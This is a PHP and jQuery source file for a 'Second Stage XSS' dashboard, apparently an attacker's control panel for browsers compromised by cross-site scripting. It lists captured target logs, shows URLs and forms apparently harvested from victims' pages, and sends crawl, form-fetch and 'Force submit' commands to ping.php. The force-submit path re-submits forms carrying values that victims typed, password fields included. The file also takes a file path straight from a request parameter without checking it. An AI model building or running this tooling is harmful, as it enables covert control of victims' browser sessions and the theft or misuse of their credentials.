<?php

function log_list(){
	$path    = '.';
	$files = array_diff(scandir($path), array('.', '..'));
	$arr_files = [];
	foreach ($files as $file){
		$ext = new SplFileInfo($file); 
		if ($ext->getExtension()=="txt") {
			$file = str_replace(".txt", "",$file);
			array_push($arr_files, $file);
		}
	}
	return $arr_files;
}

function enread($filename,$start,$end){
	$get = false;
	$res = [];
	foreach(file($filename) as $line) {
		$line = trim($line);
		if ($line == $start){
			$get = true;
			continue;
		} 
		if ($line == $end) $get = false;
		if ($get && ($line !== "")) array_push($res, $line);
	}
	return $res;
}

function enread_forms($filename){
	$string = [];
	$string = enread($filename,"##FORMS##","##END##");

	$forms_per_urls = explode("#|#",$string[0]);

	$xurls = [];
	$urls = [];

	foreach($forms_per_urls as $fpu){
		$xurls = explode("|_|",$fpu);
		array_push($urls,$xurls[0]);
	}
	return $string;
}

if (isset($_GET['en'])){
	header('Content-Type: application/json');
	if (isset($_GET['target'])){
		$en_do = $_GET['en'];
		$target = $_GET['target'].".txt";
		if ($en_do == 'list_url'){
			$urls = enread($target,"##URLS##","##FORMS##");
			die(json_encode($urls));
		} elseif ($en_do == 'get_forms') {
			$forms = enread_forms($target);
			die(json_encode($forms));
		}
	} else {
		die(json_encode(log_list()));	
	}
}

?>

<html>
<head>
	<title>Dashboard</title>
	<link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
	<link rel="stylesheet" href="https://code.getmdl.io/1.3.0/material.indigo-pink.min.css">
	<script defer src="https://code.getmdl.io/1.3.0/material.min.js"></script>
	<script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
</head>
<body style="padding:10px;">
<h4>Second Stage XSS</h4>
	<h5>TARGET</h5>

	<div class="targets">
		<ol id="targets"></ol>
	</div>

	<h5>URLS</h5>
	<div class="urls">
		<ol id="urls"></ol>
	</div>

	<h5>FORMS</h5>
	<div class="xforms">
		<div id="forms"></div>
	</div>

	<script type="text/javascript">
		$( document ).ready(function() {
		

			//list url
			$(".targets").on("click",".url_click", function(e) {
			    var en_do = $(this).attr("data-en");
			    var en_target = $(this).attr("data-target");
			    $.get( "?en="+en_do+"&target="+en_target, function( json ) {
			    	$("ol#urls").empty();
				  	for(var i=0;i<json.length;i++){
				  		$("ol#urls").append("<li>"+json[i]+" <a class='crawl_click' href='#' data-en='crawl_url' data-target='"+en_target+"' data-target-page='"+json[i]+"'>[crawl]</a> <a class='get_form_click' href='#' data-en='get_forms' data-target='"+en_target+"' data-target-page='"+json[i]+"'>[get forms]</a></li>");
			        }
				});

				//list forms
				$.get( "?en=get_forms&target="+en_target, function( data_form ) {
					var per_url = data_form.toString().split('#|#');
					var res_forms = "";
					var i = 1;

					for (pu of per_url) {
						if (pu == "") continue;
					  	per_segment = pu.toString().split('|_|');
					  	
						var ips = 1;
						for (ps of per_segment) {
							if (ips == 1) {
								res_forms = res_forms + i + "." + ps + "<br>"; 
							} else {
								res_forms = res_forms + "<div class='div-forms' style='padding:10px;margin:10px;border:1px solid #ccc;'><div id='form-"+i+"-"+ips+"'>" + ps + "</div><br><a href='javascript:void(0);' data-id='form-"+i+"-"+ips+"' class='force-submit' data-target='"+en_target+"'>Force submit</a></div>";
							}
							ips++;
						}
						i++;
					}
					$("#forms").html(res_forms);
				});
			});

			//submit
			$(document).on("click",".force-submit", function(e) {
			    var en_do = "submit_form";
			    var en_target = $(this).attr("data-target");
			    
			    var en_id = $(this).attr("data-id");

		        var input = $('div#'+en_id+' input[type=text]'),
		        inputpass = $('div#'+en_id+' input[type=password]'),
		        inputemail = $('div#'+en_id+' input[type=email]'),
		        inputurl = $('div#'+en_id+' input[type=url]'),
		        checkbox = $('div#'+en_id+' input[type=checkbox]'),
		        text = $('div#'+en_id+' textarea'),
		        select = $('div#'+en_id+' select');
		        input.attr('value', input.val());
		        inputpass.attr('value', inputpass.val());
		        inputemail.attr('value', inputemail.val());
		        inputurl.attr('value', inputurl.val());
		        checkbox.attr('checked', checkbox.prop('checked'));
		        text.html(text.val());
		        select.find(':selected').attr('selected', 'selected');
			    
			    var inner = $('#'+en_id).html();

			    innerhtml = inner.replace("</form", "<input type='submit' class='btn_en_force'></form");

			    alert(innerhtml);

			    $.post( "ping.php", { domain: en_target, page: innerhtml, en:en_do })
				  .done(function( data ) {
				    //alert( "Data Loaded: " + data );
				});

			});

			//crawl
			$(".urls").on("click",".crawl_click", function(e) {
			    var en_do = $(this).attr("data-en");
			    var en_target = $(this).attr("data-target");
			    var en_target_page = $(this).attr("data-target-page");

			    $.post( "ping.php", { domain: en_target, page: en_target_page, en:en_do })
				  .done(function( data ) {
				    //alert( "Data Loaded: " + data );
				});
			});

			//get forms
			$(".urls").on("click",".get_form_click", function(e) {
			    var en_do = $(this).attr("data-en");
			    var en_target = $(this).attr("data-target");
			    var en_target_page = $(this).attr("data-target-page");

			    $.post( "ping.php", { domain: en_target, page: en_target_page, en:en_do })
				  .done(function( data ) {
				    //alert( "Data Loaded: " + data );
				});
			});

			

			//list target
		    $.get( "?en=1", function( json ) {
			  	for(var i=0;i<json.length;i++){
			  		$("ol#targets").append("<li><a class='url_click' href='#' data-en='list_url' data-target='"+json[i]+"'>"+json[i]+"</a></li>");
		        }
			});
		});
	</script>
</body>
</html>